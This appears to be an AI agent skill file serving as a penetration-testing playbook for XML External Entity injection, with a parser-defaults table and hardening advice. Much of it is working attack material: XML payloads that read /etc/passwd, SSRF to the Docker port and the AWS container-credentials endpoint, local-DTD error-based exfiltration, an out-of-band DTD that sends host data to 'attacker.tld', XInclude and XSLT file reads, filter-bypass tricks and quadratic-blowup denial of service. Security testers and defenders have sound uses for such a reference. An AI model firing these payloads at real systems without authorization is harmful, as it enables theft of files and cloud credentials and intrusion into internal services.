---
name: xxe
description: XXE testing for external entity injection, file disclosure, and SSRF via XML parsers
---

# XXE

XML External Entity injection is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.

## Attack Surface

**Capabilities**
- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification

**Injection Surfaces**
- REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office)
- PDF generators, build/report pipelines, config importers

**Transclusion**
- XInclude and XSLT `document()` loading external resources

## High-Value Targets

**File Uploads**
- SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives
- Android/iOS plist, project config imports

**Protocols**
- SOAP/XML-RPC/WebDAV/SAML (ACS endpoints)
- RSS/Atom feeds, server-side renderers and converters

**Hidden Paths**
- Parameters: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude"
- Processing-instruction headers

## Detection Channels

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error-Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### OAST

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)
- Use `interactsh-client -v` for the callback domain. Reference it as the
  external DTD host (e.g. `<!ENTITY % ex SYSTEM "http://xyz.oast.fun/x.dtd">`)
  and read the DNS/HTTP hit on the interactsh stdout.

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

### Egress-Free Exfiltration (Local DTD Reuse)

When the parser processes DTDs but **outbound network is blocked** (no external
DTD fetch, no OAST) and the response doesn't reflect entity content, you can
still exfiltrate in-band by reusing a DTD file that already exists on the target
host and redefining one of the parameter entities it declares — the classic
GoSecure technique. Referencing the local DTD and overriding its entity makes
the parser run your exfil logic and surface the target file inside a parse
**error message**, with zero attacker-controlled network:

```xml
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;err;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<r></r>
```

- The overridden entity name (`%constant` above) and the DTD path are
  **target-specific** — pick a DTD known to exist on the OS and redefine the
  parameter entity *that DTD actually references internally*. Common candidates:
  `/usr/share/xml/fontconfig/fonts.dtd` (fontconfig, redefine `%constant;`),
  JVM/`jaxp` bundled DTDs, and `/usr/share/yelp/dtd/docbookx.dtd`. Enumerate a
  readable local DTD first, then match the override to it.
- The file content lands in the error (e.g. "file not found: .../root:x:0:0:...").
  Requires that the parser expands parameter entities and surfaces errors —
  confirm both with a benign probe before the full payload.

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Key Vulnerabilities

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content
- Works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Effective where entity resolution is blocked but XInclude remains enabled in the pipeline.

### XSLT Document

XSLT processors can fetch external resources via `document()`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers.

### Protocol Wrappers

- Java: `jar:`, `netdoc:`
- PHP: `php://filter`, `expect://` (when module enabled) — for the filter-chain LFI→RCE primitive (Synacktiv generator), load `path_traversal_lfi_rfi`
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Bypass Techniques

**Encoding Variants**
- UTF-16/UTF-7 declarations, mixed newlines
- CDATA and comments to evade naive filters

**DOCTYPE Variants**
- PUBLIC vs SYSTEM, mixed case `<!DoCtYpE>`
- Internal vs external subsets, multi-DOCTYPE edge handling

**Network Controls**
- If network blocked but filesystem readable, pivot to local file disclosure
- If files blocked but network open, pivot to SSRF/OAST

**Content-Type Switching (reach the XML parser)**
- A JSON endpoint often has a dormant XML body parser one header away. Resend
  the request with `Content-Type: application/xml` (also `text/xml`,
  `application/*+xml`, SOAP `application/soap+xml`) and an XML body — many
  frameworks content-negotiate the body parser from the header (Spring
  `@RequestBody` via Jackson-XML/JAXB, ASP.NET model binding, Rails `params`,
  Express with an `xml` body parser). The XML path frequently uses a *different,
  less-hardened* parser than the JSON path, so an endpoint that looks
  JSON-only can be XXE-vulnerable. Try it on every JSON API before concluding
  no XML surface exists.

**Entity-Expansion DoS: Billion Laughs vs Quadratic Blowup**
- **Billion laughs** is *exponential*: nested entities each expanding the
  previous ~10× (`lol1`→10×`lol0`, ... `lol9`→10⁹ chars). Modern parsers cap
  entity nesting depth/count, which blocks it.
- **Quadratic blowup** evades those caps: define **one** large entity (say 100 KB
  of `A`) and reference it a few thousand times in the document body. Entity
  count and nesting stay tiny, but total expanded size is O(n²) → memory/CPU
  exhaustion. Use it when a billion-laughs probe is rejected by an expansion
  limit. Run either only within explicit DoS-authorized scope and with ceilings.

## Parser Defaults by Stack

"Treat every XML input as untrusted" holds, but modern defaults decide whether
a given parser is *actually* vulnerable — so fingerprint the stack before
investing in payloads. Entity-resolution defaults (Python rows measured locally
on 3.14 / lxml; others from documented behavior, marked):

| Parser | External entities by default | Notes |
|---|---|---|
| Python `xml.etree.ElementTree` | **off** — raises `ParseError` on any external/undefined entity (measured) | no external-entity support at all; XInclude/XSLT not in ET |
| Python `lxml.etree` | **off** (measured: raises); vulnerable only with `XMLParser(resolve_entities=True, no_network=False, load_dtd=True)` | `no_network=True` is the default; opt-in resolves file:// (measured) |
| Python `minidom`/`sax`/`pulldom` | external general entities off in modern CPython; use `defusedxml` to forbid DTD outright | `defusedxml.*` monkeypatches all stdlib parsers to reject DOCTYPE |
| PHP `DOMDocument`/`SimpleXML` (libxml) | **off** since libxml 2.9 (documented; test env ships libxml 2.15.3) | `libxml_disable_entity_loader()` is deprecated/no-op in PHP 8.0 because the default is already safe; vulnerable only if code opts in with `LIBXML_NOENT | LIBXML_DTDLOAD` and an entity loader that fetches |
| Java `DocumentBuilderFactory` / `SAXParserFactory` / `XMLInputFactory` | **on** unless hardened (documented) — the classic XXE-by-default stack | harden with `FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`, and disabling external general + parameter entities |
| .NET `XmlReader` / `XmlDocument` | .NET ≥4.5.2: DTD processing off by default (documented); vulnerable with `DtdProcessing.Parse` **and** a non-null `XmlResolver` | legacy `XmlTextReader` resolves by default |

Practical read: **Java is the stack most likely vulnerable out of the box**;
Python and modern-PHP/.NET are usually safe *for entity resolution* unless
explicitly misconfigured — so a finding there is misconfiguration or a legacy
parser. XInclude and XSLT are **separate switches** that frequently stay
enabled after entity resolution is disabled (Pro Tip 3), so keep probing them
regardless of the entity-default above.

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude
- Test ACS endpoints with minimal probes

### SVG and Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML
- Attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML
- Insert payloads into document.xml, rels, or drawing XML and repackage

## Testing Methodology

1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
2. **Capability probes** - Does parser accept DOCTYPE? Resolve external entities? Allow network access? Support XInclude/XSLT?
3. **Establish oracle** - Error shape, length/ETag diffs, OAST callbacks
4. **Escalate** - Targeted file/SSRF payloads
5. **Validate parity** - Same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs

## Validation

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

## False Positives

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

## Impact

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Pro Tips

1. Prefer OAST first; it is the quietest confirmation in production-like paths
2. When content is sanitized, use error-based and length/ETag diffs
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS
7. Test background processors separately; they often use different parser settings
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE
9. Combine with path traversal and deserialization where XML touches downstream systems
10. Document exact parser behavior per stack; defenses must match real libraries and flags

## Summary

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.
